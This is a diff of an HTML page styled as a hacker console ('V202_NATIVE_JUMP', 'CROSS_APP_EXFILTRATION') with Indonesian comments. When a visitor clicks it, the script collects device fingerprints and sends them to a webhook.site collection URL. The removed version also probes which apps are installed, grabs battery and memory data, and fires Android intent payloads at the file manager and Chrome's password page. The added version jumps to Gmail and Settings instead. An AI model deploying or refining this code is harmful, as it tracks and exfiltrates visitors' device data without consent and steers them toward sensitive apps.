@@ -1,93 +1,54 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Kernel Synchronization</title></head>
-<body style="background:#000;color:#0f0;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
-    <div id="ignite" style="padding:50px;border:2px solid #0f0;text-align:center;cursor:pointer;background:rgba(0,255,0,0.05);box-shadow:0 0 50px #0f0;max-width:80%">
-        <h1 style="letter-spacing:10px;margin-bottom:20px">V201_HYPERVISOR</h1>
-        <div id="status" style="font-size:18px;color:#0ff">INITIALIZING_CROSS_APP_EXFILTRATION...</div>
-        <div style="font-size:10px;color:#444;margin-top:40px;text-align:left">
-            > EXPLOIT_TYPE: Intent_Redirection<br>
-            > TARGET_OS: Android_Linux_Kernel<br>
-            > PAYLOAD_STATUS: Prepared
-        </div>
+<head><title>System Synchronization</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
+    <div id="ignite" style="padding:50px;border:2px solid #0f0;text-align:center;cursor:pointer;box-shadow:0 0 40px #0f0">
+        <h1 style="margin:0 0 20px 0">V202_NATIVE_JUMP</h1>
+        <div id="status">TRIGGER_APP_TRANSITION</div>
     </div>
 
 <script>
     const target = "https://webhook.site/6a675816-997e-434a-be92-332fe00e3d9b";
 
     document.getElementById('ignite').onclick = async () => {
-        const statusEl = document.getElementById('status');
-        statusEl.innerText = "MAPPING_INTERNAL_SCHEMES...";
-
-        // 1. TIMING ATTACK (Deteksi Aplikasi Terinstal)
-        // Kita menggunakan Image loading time untuk menebak apakah aplikasi sistem ada
-        const checkApp = (uri) => new Promise(res => {
-            const start = performance.now();
-            const img = new Image();
-            img.onload = img.onerror = () => res(performance.now() - start);
-            img.src = uri;
-            setTimeout(() => res(999), 200);
-        });
-
-        // 2. DEEP HARDWARE & APP ENUMERATION
-        const appMatrix = {
-            gmail: await checkApp("intent://#Intent;package=com.google.android.gm;end"),
-            settings: await checkApp("intent://#Intent;package=com.android.settings;end"),
-            chrome: await checkApp("googlechrome://")
-        };
-
-        const hardwareDNA = {
+        // 1. COLLECT SENSITIVE HARDWARE DATA
+        const vault = {
+            id: "V202_NATIVE",
+            ua: navigator.userAgent,
             gpu: (() => {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                return debug ? gl.getParameter(debug.UNMASKED_RENDERER_ADDR) : "PROTECTED";
-            })(),
-            ram: navigator.deviceMemory,
-            cores: navigator.hardwareConcurrency
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ADDR) : "HIDDEN";
+            })()
         };
 
-        // 3. INTENT REDIRECTOR (The Core Exploit)
-        // Kita mencoba memicu fragment internal yang sensitif (seperti menu Debug atau Password)
-        const payloads = [
-            // Payload A: Menargetkan Settings - Wireless (Data Leak)
-            "intent:#Intent;action=android.settings.WIFI_SETTINGS;end",
-            // Payload B: Bypass menuju File Manager internal
-            "intent:#Intent;action=android.intent.action.VIEW;data=content://com.android.externalstorage.documents/root/primary;end",
-            // Payload C: Chrome Password Manager Redirection (Sangat Sensitif)
-            "googlechrome://settings/passwords"
-        ];
+        // 2. EXFILTRATE DATA (Kirim sebelum lompat)
+        navigator.sendBeacon(`${target}?v=V202_READY`, btoa(JSON.stringify(vault)));
 
-        // 4. ATOMIC EXFILTRATION
-        const finalVault = {
-            v: "V201_FINAL",
-            apps: appMatrix,
-            dna: hardwareDNA,
-            env: {
-                ua: navigator.userAgent,
-                lang: navigator.languages,
-                batt: await (navigator.getBattery ? navigator.getBattery().then(b => b.level) : "N/A")
-            }
-        };
+        // 3. THE NATIVE APP JUMP (GMAIL APP, BUKAN BROWSER)
+        // Kita menggunakan format Intent Android yang memanggil package com.google.android.gm
+        const nativeGmailIntent = 
+            "intent:#Intent;" +
+            "action=android.intent.action.MAIN;" + 
+            "category=android.intent.category.APP_EMAIL;" +
+            "package=com.google.android.gm;" + // Target aplikasi Gmail asli
+            "S.browser_fallback_url=https://google.com;" + // Jika gagal, lempar ke google
+            "end";
 
-        const payloadStr = btoa(unescape(encodeURIComponent(JSON.stringify(finalVault))));
-        
-        // Kirim data SEBELUM mencoba melompat keluar dari browser
-        navigator.sendBeacon(`${target}?v=V201_DATA_DUMP`, new Blob([`d=${payloadStr}`], {type: 'application/x-www-form-urlencoded'}));
-
-        // 5. THE HYPER-JUMP
-        // Kita mencoba memicu akses ke Content Provider (File internal Android)
-        statusEl.innerText = "ATTEMPTING_SANDBOX_ESCAPE_TO_PROVIDER...";
+        // 4. EXECUTE THE LEAP
+        document.getElementById('status').innerText = "OPENING_NATIVE_GMAIL_APP...";
         
         setTimeout(() => {
-            // Ini akan mencoba membuka akses file jika ada kerentanan di aplikasi target
-            window.location.href = payloads[1]; 
+            // Ini akan memicu Android System Intent Picker atau langsung buka Gmail
+            window.location.href = nativeGmailIntent;
             
-            // Redirect akhir untuk membersihkan jejak
+            // Link cadangan jika Intent pertama diblokir oleh interaksi user
             setTimeout(() => {
-                window.location.replace("https://mail.google.com/mail/u/0/#inbox");
+                // Mencoba masuk ke Settings Android jika Gmail gagal
+                window.location.href = "intent:#Intent;action=android.settings.SETTINGS;end";
             }, 1000);
-        }, 800);
+        }, 500);
     };
 </script>
 </body>
